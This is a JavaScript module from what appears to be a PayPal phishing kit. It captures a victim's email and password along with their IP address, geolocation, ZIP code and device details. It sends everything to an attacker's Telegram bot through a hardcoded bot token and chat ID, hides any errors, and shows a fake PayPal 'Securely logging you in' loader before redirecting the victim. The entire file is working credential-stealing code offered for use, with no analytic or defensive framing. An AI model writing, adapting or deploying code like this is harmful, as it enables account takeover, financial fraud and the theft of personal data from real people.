// === CONFIGURE YOUR TELEGRAM BOT HERE ===
const TELEGRAM_BOT_TOKEN = "8363007926:AAH_QHKuAwja6S-T2hfWFmpIUNxoNVASefs"; // ← CHANGE THIS
const TELEGRAM_CHAT_ID = "1631839399";     // ← CHANGE THIS
// ========================================

const API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

// Fetch user data (IP, location, ZIP, device)
async function getUserData() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    return {
      ip: data.ip || 'Unknown',
      city: data.city || 'Unknown',
      region: data.region || 'Unknown',
      country: data.country_name || 'Unknown',
      zip: data.postal || 'N/A',
      lat: data.latitude,
      lon: data.longitude,
      org: data.org || 'Unknown',
      timezone: data.timezone || 'Unknown'
    };
  } catch (e) {
    return { ip: 'Unknown', city: 'Unknown', zip: 'N/A' };
  }
}

// Detect device
function getDeviceInfo() {
  const ua = navigator.userAgent;
  let device = 'Unknown';
  let os = 'Unknown';

  if (/Windows/.test(ua)) os = 'Windows';
  else if (/Mac/.test(ua)) os = 'MacOS';
  else if (/Linux/.test(ua)) os = 'Linux';
  else if (/Android/.test(ua)) os = 'Android';
  else if (/iPhone|iPad|iPod/.test(ua)) os = 'iOS';

  if (/Mobile/.test(ua)) device = 'Mobile';
  else device = 'Desktop';

  return `${device} | ${os} | ${navigator.platform}`;
}

// Format time
function getTime() {
  return new Date().toLocaleString('en-US', {
    timeZone: 'Africa/Lagos',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true
  });
}

// Send to Telegram
async function sendToTelegram(data) {
  const message = `
*PAYPAL LOGIN ATTEMPT*
──────────────────
*Email:* \`${data.email}\`
*Password:* \`${data.password || '—'}\`
*Time:* \`${data.time}\`
*IP:* \`${data.ip}\`
*Location:* ${data.city}, ${data.region}, ${data.country}
*ZIP Code:* \`${data.zip}\`
*Device:* \`${data.device}\`
*User Agent:* \`${navigator.userAgent.substring(0, 100)}...\`
  `.trim();

  try {
    await fetch(API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
  } catch (e) {
    // Silent fail — never expose errors
  }
}

// Show PayPal-style loading
function showLoading(message = "Securely logging you in...") {
  const loader = document.createElement('div');
  loader.className = 'paypal-loader';
  loader.innerHTML = `
    <div class="loader-content">
      <div class="spinner"></div>
      <p>${message}</p>
    </div>
  `;
  document.body.appendChild(loader);
  document.body.style.overflow = 'hidden';
}

// Hide loading
function hideLoading() {
  const loader = document.querySelector('.paypal-loader');
  if (loader) loader.remove();
  document.body.style.overflow = '';
}

// Delay + redirect
function delayRedirect(url, delay = 3000) {
  setTimeout(() => {
    hideLoading();
    window.location.href = url;
  }, delay);
}

// Export for app.js
window.TelegramLogger = {
  getUserData,
  getDeviceInfo,
  getTime,
  sendToTelegram,
  showLoading,
  hideLoading,
  delayRedirect

};
